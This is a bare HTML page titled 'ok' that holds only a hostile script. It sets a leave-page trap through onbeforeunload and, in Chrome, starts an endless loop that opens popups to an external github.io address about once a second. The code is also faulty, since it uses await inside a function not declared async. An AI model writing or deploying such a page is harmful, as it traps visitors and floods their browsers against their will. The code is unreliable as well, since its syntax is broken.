<!DOCTYPE html>
<html>
<head>
  <title>ok</title>
  <script type="text/javascript">
    onbeforeunload = () => true;

function openMultiplePopupsInfinite() {
  const url = 'https://uexedus.github.io/'; // Replace with the desired URL
  while (true) {
    window.open(url, 'popUpWindow', 'height=300,width=400,left=100,top=100');
    await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for a second before opening the next one
  }
}

if (navigator.userAgent.indexOf("Chrome") != -1) {
  setTimeout(function() {
    openMultiplePopupsInfinite();
  }, 100);
}


  </script>
</head>
<body>
</body>
</html>
